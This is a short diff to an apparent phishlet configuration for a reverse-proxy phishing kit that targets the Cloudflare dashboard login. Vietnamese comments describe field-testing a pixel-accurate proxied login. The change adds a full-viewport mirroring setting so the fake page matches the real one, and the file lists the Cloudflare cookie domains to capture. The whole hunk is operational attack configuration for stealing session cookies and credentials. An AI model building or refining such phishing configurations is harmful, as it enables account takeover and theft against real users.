@@ -4,6 +4,7 @@
 # Selectors lấy từ field-test 23-09 (login render pixel-true qua proxy).
 phishlet: cloudflare
 flow: generic
+mirror: full          # stream toàn viewport (trang 2 cột nhìn 1:1 với origin)
 signin_url: "https://dash.cloudflare.com/login"
 done_hosts: ["dash.cloudflare.com"]
 cookie_domains: ["cloudflare.com"]
